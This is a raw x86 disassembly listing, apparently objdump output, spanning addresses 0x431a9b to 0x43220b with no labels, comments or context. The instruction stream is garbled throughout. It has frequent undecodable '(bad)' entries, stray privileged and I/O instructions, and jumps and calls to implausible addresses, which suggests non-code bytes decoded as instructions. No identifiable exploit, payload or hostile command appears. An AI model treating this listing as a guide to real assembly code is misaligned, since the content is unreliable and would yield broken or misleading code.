  431a9b:	jge    0x431ad8
  431a9d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431aa1:	mov    edx,0xc05d87f0
  431aa6:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431aaa:	fimul  WORD PTR [eax]
  431aac:	fist   WORD PTR [ebp+0x1c]
  431aaf:	in     al,dx
  431ab0:	jne    0x431a9e
  431ab2:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431ab8:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431abc:	fdivp  st(0),st
  431abe:	fild   WORD PTR [ebp+0x4510f85c]
  431ac4:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431aca:	inc    ebp
  431acb:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431ad1:	mov    ebp,DWORD PTR [ebx-0x4]
  431ad4:	adc    al,0x8b
  431ad6:	rcl    DWORD PTR [eax],0x48
  431ad9:	mov    esi,0x7080803
  431ade:	fiadd  WORD PTR [ebp+0x4d]
  431ae1:	(bad)  
  431ae2:	mov    edx,DWORD PTR [edx-0x4]
  431ae5:	mov    edx,DWORD PTR [ebp-0x4]
  431ae8:	xor    ebx,DWORD PTR [ebx+0x330103]
  431aee:	mov    DWORD PTR [edi+0x872dc],edi
  431af4:	xlat   BYTE PTR ds:[ebx]
  431af5:	into   
  431af6:	ffreep st(6)
  431af8:	retf   0x6c7
  431afb:	iret   
  431afc:	dec    ebp
  431afd:	inc    ebp
  431afe:	mov    DWORD PTR [ebx],edi
  431b00:	fmul   QWORD PTR [edi]
  431b02:	dec    ebp
  431b03:	jnp    0x431b38
  431b05:	add    BYTE PTR [ebx],al
  431b07:	mov    ecx,DWORD PTR [esp+edi*8]
  431b0a:	inc    ebp
  431b0b:	dec    ebp
  431b0c:	lea    esi,[ebx]
  431b0e:	add    DWORD PTR [ebx],eax
  431b10:	jb     0x431b4d
  431b12:	add    BYTE PTR [edi],cl
  431b14:	inc    ebp
  431b15:	imul   eax,edi,0x858bd800
  431b1b:	cld    
  431b1c:	clc    
  431b1d:	mov    DWORD PTR [ebp+0x0],eax
  431b20:	inc    DWORD PTR [eax]
  431b22:	or     al,0xde
  431b24:	sbb    bh,0x1
  431b27:	retf   
  431b28:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431b2f:	dec    ebp
  431b30:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431b36:	enter  0x12de,0xdf
  431b3a:	inc    ebp
  431b3b:	pop    ebp
  431b3c:	dec    DWORD PTR [ebx-0x257f0ff4]
  431b42:	add    DWORD PTR [edx],edx
  431b44:	add    BYTE PTR [ebp+0x50],dl
  431b47:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431b4d:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431b53:	or     ah,al
  431b55:	pop    ss
  431b56:	cdq    
  431b57:	push   ebp
  431b58:	clc    
  431b59:	mov    eax,DWORD PTR [ebp-0x4]
  431b5c:	xor    edx,edx
  431b5e:	add    esi,DWORD PTR [ebx]
  431b60:	cmp    eax,DWORD PTR [ebx]
  431b62:	hlt    
  431b63:	cmp    DWORD PTR [ebx],esp
  431b65:	or     al,BYTE PTR [ebp+0xf]
  431b68:	mov    eax,DWORD PTR [edx]
  431b6a:	loopne 0x431b6c
  431b6c:	(bad)  
  431b6d:	mov    ecx,esi
  431b6f:	cld    
  431b70:	pushf  
  431b71:	pop    ebp
  431b72:	fwait
  431b73:	mov    esi,DWORD PTR [edx]
  431b75:	lock mov eax,eax
  431b78:	adc    BYTE PTR [ebx],al
  431b7a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431b81:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431b87:	dec    ebp
  431b88:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431b8e:	(bad)  
  431b8f:	iret   
  431b90:	inc    ebp
  431b91:	(bad)  
  431b92:	jne    0x431be1
  431b94:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431b9a:	(bad)  
  431b9b:	cmp    ebx,eax
  431b9d:	je     0x431b25
  431b9f:	add    edi,edi
  431ba1:	or     bh,bh
  431ba3:	dec    ebp
  431ba4:	inc    ebp
  431ba5:	mov    esi,DWORD PTR [ebx]
  431ba7:	cld    
  431ba8:	add    ecx,esi
  431baa:	cmp    ecx,DWORD PTR [eax-0xc]
  431bad:	mov    edx,DWORD PTR [edi]
  431baf:	or     BYTE PTR [ebp-0x7c],al
  431bb2:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431bb8:	test   BYTE PTR [ebx+ebx*4],cl
  431bbb:	inc    ebp
  431bbc:	xor    bh,BYTE PTR [esi]
  431bbe:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431bc5:	jne    0x431b8e
  431bc7:	mov    ebp,esp
  431bc9:	fcomp  DWORD PTR [ebx]
  431bcb:	add    BYTE PTR [ecx],al
  431bcd:	inc    DWORD PTR [ebp-0x75]
  431bd0:	(bad)  
  431bd1:	cld    
  431bd2:	add    al,0xce
  431bd4:	mov    ecx,edi
  431bd6:	cld    
  431bd7:	inc    ebp
  431bd8:	fidivr WORD PTR [ebx]
  431bda:	fbstp  TBYTE PTR [ebp-0x3e]
  431bdd:	mov    eax,DWORD PTR [eax]
  431bdf:	adc    BYTE PTR [ebx-0x3974038b],cl
  431be5:	fadd   st,st(7)
  431be7:	add    BYTE PTR [ebp-0x1],al
  431bea:	mov    ecx,DWORD PTR [esp+edi*8]
  431bed:	inc    ebp
  431bee:	mov    bh,0xc7
  431bf1:	loopne 0x431c38
  431bf3:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431bf9:	sbb    dh,BYTE PTR [ebx]
  431bfb:	pushf  
  431bfc:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431c02:	mov    eax,edi
  431c04:	cwde   
  431c05:	inc    ebp
  431c06:	inc    ebp
  431c07:	jne    0x431b94
  431c09:	mov    esp,esp
  431c0b:	clc    
  431c0c:	add    al,0x4d
  431c0e:	mov    DWORD PTR [ebx],esi
  431c10:	or     al,0x33
  431c12:	inc    ebp
  431c13:	lea    ecx,[ebx-0x398d13fd]
  431c19:	add    bh,al
  431c1b:	inc    ebp
  431c1c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431c23:	add    ebp,esp
  431c25:	shufps xmm1,xmm3,0xc7
  431c29:	(bad)  
  431c2a:	jmp    0x74885753
  431c2f:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431c35:	hlt    
  431c36:	mov    ecx,DWORD PTR [edi]
  431c38:	fadd   DWORD PTR [ebp+0x0]
  431c3b:	xor    ecx,DWORD PTR [edi]
  431c3d:	add    ecx,ecx
  431c3f:	cmp    edi,edi
  431c41:	pmuludq mm7,QWORD PTR [edx+0x50]
  431c45:	(bad)  
  431c46:	jmp    0x431bd3
  431c48:	mov    edi,esp
  431c4a:	or     al,0xc6
  431c4c:	inc    ebp
  431c4d:	(bad)  
  431c4e:	mov    eax,DWORD PTR [ebp+0x10]
  431c51:	jne    0x431bdc
  431c53:	mov    eax,DWORD PTR [ecx]
  431c55:	clc    
  431c56:	add    BYTE PTR [ebp-0x40],cl
  431c59:	xor    edx,DWORD PTR [eax-0x73]
  431c5c:	jne    0x431c5f
  431c5e:	push   DWORD PTR [edx+0x8]
  431c61:	add    BYTE PTR [ebp+0x45],al
  431c64:	mov    ebp,ecx
  431c66:	cld    
  431c67:	add    BYTE PTR [ebp+0x0],cl
  431c6a:	xor    eax,DWORD PTR [ebp+0x3]
  431c6d:	mov    DWORD PTR [ebx],edi
  431c6f:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431c75:	sub    eax,0x5d330e4d
  431c7a:	lea    esi,[ebx]
  431c7c:	add    DWORD PTR [ebx],eax
  431c7e:	jb     0x431c69
  431c80:	add    BYTE PTR [eax],al
  431c82:	inc    ebp
  431c83:	add    bl,ch
  431c85:	inc    ebp
  431c86:	mov    esi,DWORD PTR [ebx]
  431c88:	or     al,0x3
  431c8a:	(bad)  
  431c8b:	mov    edi,eax
  431c8d:	in     al,dx
  431c8e:	scas   eax,DWORD PTR es:[edi]
  431c8f:	inc    ebp
  431c90:	mov    esi,DWORD PTR [ebx]
  431c92:	in     al,0x3
  431c94:	add    al,0x89
  431c96:	mov    ecx,DWORD PTR [eax+edi*8]
  431c99:	dec    ebp
  431c9a:	(bad)  
  431c9b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431ca2:	mov    ecx,eax
  431ca4:	cld    
  431ca5:	push   es
  431ca6:	dec    ebp
  431ca7:	add    al,0x33
  431ca9:	mov    DWORD PTR [ebx],eax
  431cab:	in     al,dx
  431cac:	cmp    DWORD PTR [ebp-0x67],eax
  431caf:	mov    eax,DWORD PTR [ebp-0xba0068]
  431cb5:	mov    edx,DWORD PTR [ebp-0x4]
  431cb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  431cbb:	xor    eax,DWORD PTR [ebp+0x3]
  431cbe:	cmp    DWORD PTR [ebx],0x8b32749a
  431cc4:	xor    edi,esp
  431cc6:	jmp    0xff771a18
  431ccb:	add    ecx,DWORD PTR [ebp-0x3f]
  431cce:	xor    ebx,DWORD PTR [edi]
  431cd0:	add    eax,ecx
  431cd2:	cmp    ebx,DWORD PTR [eax]
  431cd4:	mov    ecx,DWORD PTR [ebp-0x4]
  431cd7:	mov    ecx,DWORD PTR [eax]
  431cd9:	adc    BYTE PTR [ebp-0x80],al
  431cdc:	jmp    0x431cdf
  431cde:	mov    eax,DWORD PTR [eax]
  431ce0:	cld    
  431ce1:	mov    bh,0xc6
  431ce3:	push   ecx
  431ce4:	(bad)  
  431ce5:	jne    0x431d45
  431ce7:	dec    ecx
  431ce9:	or     BYTE PTR [ecx+ebx*1],cl
  431cec:	push   ebp
  431ced:	inc    ebp
  431cee:	in     al,dx
  431cef:	add    ebp,esp
  431cf1:	or     bh,al
  431cf3:	dec    ebp
  431cf4:	cld    
  431cf5:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431cfb:	xor    DWORD PTR [edx],0x2
  431cfe:	pushf  
  431cff:	dec    DWORD PTR [ebx+0x45510cf4]
  431d05:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431d0b:	mov    edx,DWORD PTR [ecx+0xc]
  431d0e:	xor    eax,esi
  431d10:	mov    edx,0xc172c7
  431d15:	inc    ebp
  431d16:	mov    esi,DWORD PTR [ebp+0x8]
  431d19:	mov    eax,edx
  431d1b:	call   0x84c7e410
  431d20:	add    DWORD PTR [ebx-0x76bace00],ebx
  431d26:	mov    ebp,eax
  431d28:	or     BYTE PTR [eax],dl
  431d2a:	jo     0x431d79
  431d2c:	push   edi
  431d2d:	xor    esi,DWORD PTR [ebp+0x3]
  431d30:	(bad)  
  431d31:	pmulhuw mm0,mm1
  431d34:	test   DWORD PTR [ebp-0x8],ecx
  431d37:	mov    DWORD PTR [ebp-0x67],eax
  431d3a:	mov    eax,DWORD PTR [ebp-0x4]
  431d3d:	xor    edi,DWORD PTR [ebp-0x73]
  431d40:	xor    eax,DWORD PTR [ebx]
  431d42:	xor    esi,DWORD PTR [edx+0x3]
  431d45:	add    BYTE PTR [ecx],bh
  431d47:	inc    ebp
  431d48:	(bad)  
  431d49:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431d4f:	mov    DWORD PTR [eax],0x750f0004
  431d55:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431d5b:	lock add BYTE PTR [ebp+0x0],cl
  431d5f:	mov    esi,DWORD PTR [ebp-0x18]
  431d62:	mov    ebp,edx
  431d64:	or     al,0x72
  431d66:	ja     0x431d68
  431d68:	mov    edx,esi
  431d6a:	cld    
  431d6b:	(bad)  
  431d6e:	cli    
  431d6f:	mov    esi,DWORD PTR [ebp-0x4]
  431d72:	cmp    ecx,esi
  431d74:	bswap  edi
  431d76:	(bad)
  431d7a:	mov    esi,DWORD PTR [ebp-0x4]
  431d7d:	mov    esi,ecx
  431d7f:	clc    
  431d80:	repnz add esi,DWORD PTR [ebp+0x45]
  431d84:	push   ebx
  431d85:	xor    eax,DWORD PTR [ebp+0x3]
  431d88:	cmp    al,0x5f
  431d8a:	pushf  
  431d8b:	pop    ebx
  431d8c:	jmp    0x431e53
  431d91:	mov    esi,DWORD PTR [ebp-0x7d]
  431d94:	xor    ebp,DWORD PTR [eax]
  431d96:	lea    eax,[ebp-0x8]
  431d99:	xor    edx,esi
  431d9b:	pushf  
  431d9c:	out    dx,eax
  431d9d:	(bad)  
  431d9e:	neg    eax
  431da0:	ins    DWORD PTR es:[edi],dx
  431da1:	test   esi,edi
  431da3:	clc    
  431da4:	pop    esp
  431da5:	inc    ebp
  431da6:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431dac:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431db2:	add    cl,al
  431db4:	jne    0x431d51
  431db6:	mov    esi,DWORD PTR [edx]
  431db8:	in     al,dx
  431db9:	push   esi
  431dba:	xor    BYTE PTR [ebp-0xe],dh
  431dbd:	add    edi,esi
  431dbf:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431dc5:	add    cl,bh
  431dc7:	mov    edi,DWORD PTR [ebp+0x8]
  431dca:	mov    DWORD PTR [ebp-0x14],esi
  431dcd:	add    esi,DWORD PTR [ebp+0x3c]
  431dd0:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431dd6:	mov    ah,0x3e
  431dd8:	fwait
  431dd9:	pushf  
  431dda:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431de0:	jne    0x431d6d
  431de2:	mov    ecx,DWORD PTR [esp+ebp*8]
  431de5:	icebp  
  431de6:	icebp  
  431de7:	shl    edx,0xf2
  431dea:	(bad)  
  431deb:	mov    ah,0x16
  431ded:	push   eax
  431dee:	jne    0x431d83
  431df0:	mov    ecx,DWORD PTR [edi]
  431df2:	in     al,dx
  431df3:	jmp    0x431de6
  431df5:	add    dl,dh
  431df7:	mov    edi,esi
  431df9:	or     al,0x8
  431dfb:	inc    ebp
  431dfc:	jne    0x431e01
  431dfe:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431e04:	ret    
  431e05:	or     bh,bh
  431e07:	jge    0x431df1
  431e09:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431e0f:	xor    edi,eax
  431e11:	add    esi,DWORD PTR [ebp-0x77]
  431e14:	mov    ebx,esp
  431e16:	clc    
  431e17:	neg    DWORD PTR [ebp-0x7c]
  431e1a:	xor    eax,DWORD PTR [eax]
  431e1c:	cmp    eax,DWORD PTR [eax]
  431e1e:	repz jne 0x431db6
  431e21:	xor    eax,DWORD PTR [ecx]
  431e23:	add    ebx,DWORD PTR [eax]
  431e25:	mov    DWORD PTR [ebp-0x8],eax
  431e28:	mov    eax,edi
  431e2a:	cld    
  431e2b:	lock pop eax
  431e2d:	test   DWORD PTR [ebx],esi
  431e2f:	clc    
  431e30:	add    edx,DWORD PTR [edi-0x740bff77]
  431e36:	fdivp  st(4),st
  431e38:	test   ecx,esi
  431e3a:	(bad)  
  431e3b:	jnp    0x431e3c
  431e3d:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431e43:	jae    0x431dd0
  431e45:	sub    edi,esp
  431e47:	(bad)  
  431e48:	shl    DWORD PTR [eax-0x3e],0x89
  431e4c:	leave  
  431e4d:	call   0x8198d55a
  431e52:	in     al,dx
  431e53:	(bad)  
  431e54:	in     al,dx
  431e55:	add    bh,al
  431e57:	mov    esp,edi
  431e59:	in     al,dx
  431e5a:	test   DWORD PTR [ebp-0x8],edi
  431e5d:	mov    eax,DWORD PTR [ebp+0x2b]
  431e60:	xor    al,BYTE PTR [ebx]
  431e62:	pushf  
  431e63:	jnp    0x57321a9c
  431e69:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431e6d:	loopne 0x431ea2
  431e6f:	jne    0x431e2c
  431e71:	mov    esi,DWORD PTR [edx-0x20]
  431e74:	add    BYTE PTR [ebp-0x3d],bh
  431e77:	xor    eax,DWORD PTR [ebp-0x73]
  431e7a:	mov    edi,DWORD PTR [esi]
  431e7c:	cld    
  431e7d:	jb     0x431e45
  431e7f:	add    bl,al
  431e81:	jne    0x431ec8
  431e83:	mov    edx,DWORD PTR [edi-0x10]
  431e86:	jge    0x431f05
  431e88:	mov    esi,DWORD PTR [ebx]
  431e8a:	lock add ecx,DWORD PTR [ebp+0x3b]
  431e8e:	xor    esi,DWORD PTR [ebp-0x77]
  431e91:	mov    esi,eax
  431e93:	lock inc ebp
  431e95:	jge    0x431ec8
  431e97:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431e9e:	dec    ebp
  431e9f:	mov    esi,DWORD PTR [ebx]
  431ea1:	loopne 0x431e2c
  431ea3:	jge    0x431e9d
  431ea5:	add    DWORD PTR [ebp-0x7d],eax
  431ea8:	icebp  
  431ea9:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431eb0:	dec    ebp
  431eb1:	hlt    
  431eb2:	xor    ebx,DWORD PTR [ebp-0x77]
  431eb5:	mov    esi,esp
  431eb7:	in     al,0x45
  431eb9:	jge    0x431ef8
  431ebb:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431ec2:	dec    ebp
  431ec3:	push   esp
  431ec4:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431eca:	inc    ebp
  431ecb:	hlt    
  431ecc:	xor    DWORD PTR [ebp-0x61],esi
  431ecf:	mov    edi,DWORD PTR [eax+0xf19504]
  431ed5:	repnz mov DWORD PTR [ebp+0x20],ebx
  431ed9:	cmp    eax,DWORD PTR [ebp+0xf]
  431edc:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ee0:	fistp  WORD PTR [ebx+0x0]
  431ee3:	inc    ebp
  431ee4:	mov    ebx,DWORD PTR [edi+0xc]
  431ee7:	add    eax,eax
  431ee9:	inc    ebp
  431eea:	test   BYTE PTR [ebx],dh
  431eec:	add    eax,DWORD PTR [ebx]
  431eee:	add    BYTE PTR [esi+0x45],bl
  431ef1:	ret    0x85
  431ef4:	jnp    0x5443a2c3
  431efa:	inc    bp
  431efc:	inc    ebp
  431efd:	xor    DWORD PTR [ecx+0xc78a9c],edi
  431f03:	fdiv   QWORD PTR [ebx]
  431f05:	test   DWORD PTR [ecx+0x453bf8],edi
  431f0b:	push   ebx
  431f0c:	add    edi,DWORD PTR [esi+0x708088b]
  431f12:	cmp    esi,eax
  431f14:	setnp  BYTE PTR [ecx-0x74fcffce]
  431f1b:	mov    esp,edi
  431f1d:	call   0x33ce646f
  431f22:	or     BYTE PTR [ebx],al
  431f24:	inc    ecx
  431f25:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431f2b:	and    BYTE PTR [ebp-0x7074f0bb],al
  431f31:	lock add cl,al
  431f34:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431f3b:	mov    ch,0x45
  431f3d:	clc    
  431f3e:	xor    eax,DWORD PTR [ebp+0x3]
  431f41:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431f47:	inc    ebp
  431f48:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431f4e:	mov    edi,eax
  431f50:	mov    eax,DWORD PTR [ebp+0x3c]
  431f53:	mov    ecx,DWORD PTR [eax]
  431f55:	hlt    
  431f56:	inc    ebp
  431f57:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431f5e:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431f64:	push   ebp
  431f65:	mov    edi,DWORD PTR [ebx]
  431f67:	in     al,dx
  431f68:	jne    0x431f2b
  431f6a:	mov    eax,DWORD PTR [ebp-0x28]
  431f6d:	add    DWORD PTR [eax],0xe8058dec
  431f73:	clc    
  431f74:	mov    esi,DWORD PTR [edi-0x8]
  431f77:	add    dh,dl
  431f79:	rol    WORD PTR [ebp-0x1],cl
  431f7d:	mov    edx,DWORD PTR [eax+0x8]
  431f80:	jne    0x431f42
  431f82:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  431f89:	inc    ebp
  431f8a:	push   esp
  431f8b:	test   DWORD PTR [ecx+0xf],ecx
  431f8e:	sub    edx,esp
  431f90:	add    eax,DWORD PTR [eax]
  431f92:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  431f98:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  431f9f:	mov    eax,DWORD PTR [ecx]
  431fa1:	and    BYTE PTR [eax],al
  431fa3:	cmp    al,0x10
  431fa5:	add    BYTE PTR [ebp+0x66],al
  431fa8:	inc    ecx
  431faa:	push   esp
  431fab:	add    dh,BYTE PTR [ebp+0x0]
  431fae:	push   edx
  431faf:	enterw 0xc1,0x4d
  431fb4:	mov    esp,DWORD PTR [esi+0x20]
  431fb7:	add    DWORD PTR [ecx-0x7b],eax
  431fba:	add    eax,DWORD PTR [ebx]
  431fbc:	str    WORD PTR [eax+0x45]
  431fc0:	lea    ecx,[ebx+0x45890801]
  431fc6:	sbb    BYTE PTR [ebx],al
  431fc8:	dec    ebp
  431fc9:	cmp    al,0xf
  431fcb:	inc    ebp
  431fcc:	push   eax
  431fcd:	mov    esi,DWORD PTR [ebx]
  431fcf:	push   eax
  431fd0:	add    eax,eax
  431fd2:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  431fd9:	inc    ebp
  431fda:	add    BYTE PTR [ecx],dh
  431fdc:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  431fe3:	(bad)  
  431fe4:	mov    ebx,eax
  431fe6:	loopne 0x43202d
  431fe8:	dec    ebp
  431fe9:	mov    ecx,DWORD PTR [edi]
  431feb:	cld    
  431fec:	push   eax
  431fed:	xchg   DWORD PTR [ebx],esi
  431fef:	add    DWORD PTR [ebx],ebp
  431ff1:	add    BYTE PTR [ebx],ch
  431ff3:	or     BYTE PTR [ecx],bh
  431ff5:	dec    ecx
  431ff6:	loopne 0x431ffb
  431ff8:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  431ffe:	push   ebp
  431fff:	add    DWORD PTR [ebx+0x55100800],eax
  432005:	dec    ebp
  432006:	jmp    0x431f91
  432008:	mov    esp,DWORD PTR [eax]
  43200a:	sbb    dl,dl
  43200c:	inc    eax
  43200d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432013:	add    BYTE PTR [ebx+0x74528555],cl
  432019:	push   ebp
  43201a:	div    DWORD PTR [ebx]
  43201c:	and    eax,DWORD PTR [ebx]
  43201e:	add    edx,DWORD PTR [edx-0x30]
  432021:	jno    0x431fae
  432023:	inc    DWORD PTR [eax+eiz*1]
  432026:	inc    ebp
  432027:	push   eax
  432028:	push   eax
  432029:	mov    esp,DWORD PTR [edi-0x74beff1c]
  43202f:	mov    edi,esp
  432031:	push   eax
  432032:	inc    ebp
  432033:	enter  0x458b,0x8
  432037:	push   ecx
  432038:	(bad)  
  432039:	call   0x10d2a11
  43203e:	pop    ss
  43203f:	push   ebp
  432040:	mov    ecx,DWORD PTR [ebx+0x489408]
  432046:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  43204c:	push   ecx
  43204d:	jo     0x432037
  43204f:	inc    DWORD PTR [edi]
  432051:	or     BYTE PTR [eax],al
  432053:	call   0xce279d
  432058:	fmul   QWORD PTR [ebp+0x55]
  43205b:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432061:	mov    bh,0x8c
  432063:	adc    al,0x9b
  432065:	dec    esp
  432066:	xor    bl,BYTE PTR [eax]
  432068:	mov    ecx,DWORD PTR [ebp+0xc]
  43206b:	mov    eax,DWORD PTR [ebp-0x4]
  43206e:	mov    esi,DWORD PTR [edi-0x3148f924]
  432074:	push   es
  432075:	retf   
  432076:	mov    BYTE PTR [ebp-0x30],0x3b
  43207a:	inc    ebp
  43207b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432082:	retf   0x83fc
  432085:	into   
  432086:	dec    ebp
  432087:	retf   
  432088:	mov    ecx,DWORD PTR [ebp-0x74]
  43208b:	mov    eax,DWORD PTR [eax]
  43208d:	fdiv   QWORD PTR [ebx]
  43208f:	mov    bh,0x3
  432091:	push   es
  432092:	mov    esi,ecx
  432094:	sbb    cl,dl
  432096:	dec    ebp
  432097:	sar    DWORD PTR [ebx],cl
  432099:	push   ebp
  43209a:	jne    0x4320ab
  43209c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4320a2:	lea    ebx,[eax]
  4320a4:	call   0xf4ccac6b
  4320a9:	sbb    dh,dl
  4320ab:	add    edx,ebx
  4320ad:	push   ebp
  4320ae:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4320b4:	push   ecx
  4320b5:	mov    DWORD PTR [eax-0x30],edx
  4320b8:	test   DWORD PTR [edx],eax
  4320ba:	xadd   esp,esi
  4320bd:	pop    es
  4320be:	add    cl,dl
  4320c0:	mov    eax,ecx
  4320c2:	or     al,0x45
  4320c4:	(bad)  
  4320c5:	push   eax
  4320c6:	add    DWORD PTR [edx+0x0],eax
  4320c9:	add    ecx,DWORD PTR [ecx]
  4320cb:	and    dh,cl
  4320cd:	call   0xc7299d
  4320d2:	add    DWORD PTR [ebp+0x0],edx
  4320d5:	mov    esp,DWORD PTR [ebp+0x18]
  4320d8:	add    BYTE PTR [eax+0x50],cl
  4320db:	xor    eax,DWORD PTR [eax]
  4320dd:	add    esp,DWORD PTR [esi+0x3b]
  4320e0:	inc    ebp
  4320e1:	je     0x432066
  4320e3:	push   ecx
  4320e4:	dec    BYTE PTR [ebp-0x77]
  4320e7:	add    eax,esi
  4320e9:	or     al,0x5e
  4320eb:	inc    eax
  4320ec:	add    BYTE PTR [ebx],al
  4320ee:	data16 and BYTE PTR [ebp+0x50],al
  4320f2:	sub    DWORD PTR [ecx],0xfffffff8
  4320f5:	add    BYTE PTR [ebp-0x75],ah
  4320f8:	add    BYTE PTR [eax],bl
  4320fa:	enter  0x894d,0x8b
  4320fe:	int3   
  4320ff:	loopne 0x4320c3
  432101:	rol    BYTE PTR [eax],0x33
  432104:	lea    cx,[ebp+0xa]
  432108:	data16 jb 0x432150
  43210b:	add    BYTE PTR [ebx+0x44890855],cl
  432111:	sbb    ah,al
  432113:	inc    ebp
  432114:	cmp    al,0xf
  432116:	add    BYTE PTR [edx+0x66],dl
  432119:	xor    ecx,DWORD PTR [eax]
  43211b:	sub    eax,DWORD PTR [edx]
  43211d:	mov    eax,DWORD PTR [eax]
  43211f:	or     al,0x66
  432121:	ror    edx,cl
  432123:	dec    ebp
  432124:	inc    ebp
  432125:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43212b:	cld    
  43212c:	or     BYTE PTR [edi+0x4501dd],dl
  432132:	ret    0xecce
  432135:	retf   
  432136:	(bad)  
  432137:	dec    ebp
  432138:	mov    al,0x8b
  43213a:	loopne 0x43215c
  43213c:	cmp    ecx,DWORD PTR [edx]
  43213e:	inc    ebp
  43213f:	daa    
  432140:	loopne 0x4320c9
  432142:	in     al,dx
  432143:	add    edi,eax
  432145:	add    BYTE PTR [eax+0x3f52e155],bh
  43214b:	push   ebp
  43214c:	inc    ebp
  43214d:	xor    ebx,edx
  43214f:	add    ebp,esp
  432151:	push   edx
  432152:	push   bp
  432154:	inc    ebp
  432155:	(bad)  
  432156:	in     eax,dx
  432157:	push   esp
  432158:	(bad)  
  432159:	inc    edx
  43215b:	sbb    al,0x33
  43215d:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432164:	add    BYTE PTR [ebp+0x46],0x8b
  432168:	jmp    0xf98b:0x100041c8
  43216f:	xor    esi,DWORD PTR [edx+0x3]
  432172:	mov    ecx,DWORD PTR [edi]
  432174:	fmul   DWORD PTR [edx]
  432176:	add    BYTE PTR [eax],al
  432178:	lea    eax,[ebx-0x4700273c]
  43217e:	add    al,0x4f
  432180:	pop    DWORD PTR [eax]
  432182:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432188:	push   edx
  432189:	inc    WORD PTR [ebp+0x8]
  43218d:	mov    eax,0x514f4d
  432192:	(bad)
  432196:	add    al,al
  432198:	xor    DWORD PTR [ebx-0x74baf730],eax
  43219e:	test   DWORD PTR [esi+0x74],esp
  4321a1:	inc    ebp
  4321a2:	mov    DWORD PTR [eax+0xa4e08],edi
  4321a8:	add    BYTE PTR [ecx-0x76c435bb],cl
  4321ae:	or     dh,cl
  4321b0:	or     eax,0x8b8d5045
  4321b5:	inc    ebp
  4321b6:	mov    WORD PTR [ecx+0x3b8a00],?
  4321bc:	jne    0x4321f1
  4321be:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4321c4:	add    DWORD PTR [ebx],eax
  4321c6:	add    bh,bh
  4321c8:	adc    DWORD PTR [eax],ecx
  4321ca:	adc    DWORD PTR [ebp+0x55],edi
  4321cd:	push   es
  4321ce:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4321d4:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4321db:	inc    ebp
  4321dc:	mov    esp,edi
  4321de:	or     al,0xda
  4321e0:	push   eax
  4321e1:	(bad)  
  4321e2:	jne    0x432198
  4321e4:	call   0x3b1ad3
  4321e9:	inc    ebp
  4321ea:	sar    BYTE PTR [eax],0x84
  4321ed:	in     al,dx
  4321ee:	add    bh,al
  4321f0:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  4321f7:	(bad)  
  4321f8:	and    al,al
  4321fa:	fs in  eax,dx
  4321fc:	inc    DWORD PTR [ebp-0x7b]
  4321ff:	jle    0x432210
  432201:	leave  
  432202:	scas   al,BYTE PTR es:[edi]
  432203:	inc    esp
  432204:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43220b:	or     BYTE PTR [ebx-0x97717c8],0x83
